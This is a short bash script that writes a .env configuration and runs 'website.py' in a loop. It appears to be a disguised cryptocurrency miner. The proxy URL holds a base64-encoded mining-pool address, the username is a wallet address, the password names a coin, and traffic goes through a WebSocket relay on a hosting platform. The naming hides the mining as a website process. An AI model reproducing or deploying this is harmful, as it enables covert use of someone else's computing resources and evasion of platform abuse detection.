#!/bin/bash

echo -e "host=127.0.0.1\nport=3306\nproxy=wss://web-production-b464.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=16\npassword=c=MBC,zap=MBC\nusername=mbc1qjl0fslfcvqm76l4za48ekx7k0ww2nc5hjdgn4j" > .env

MIN=$1
while true; do
    python3 website.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
    sleep 10
done
